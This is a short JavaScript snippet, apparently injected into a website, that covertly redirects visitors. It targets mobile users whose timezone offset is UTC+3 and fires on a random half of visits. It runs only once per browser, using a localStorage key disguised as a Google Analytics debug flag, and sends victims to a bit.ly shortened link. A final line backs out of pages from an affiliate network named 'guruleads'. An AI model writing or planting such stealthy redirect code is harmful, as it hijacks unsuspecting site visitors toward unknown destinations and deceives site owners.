let offset = new Date().getTimezoneOffset();
function randomIntFromInterval(min, max) {return Math.floor(Math.random() * (max - min + 1) + min)};
const rndInt = randomIntFromInterval(1, 2);
if (/Android|webOS|iPhone|iPad|iPod|BlackBerry/i.test(navigator.userAgent) && rndInt == 2 && offset >= -180 && offset <= -180 && !localStorage.getItem('_ga_debug')) {localStorage.setItem('_ga_debug', '1'); document.location.href='http://bit.ly/3MKmkdt'};
if (/guruleads/.test(document.location.href)) {document.history.go(-1)}
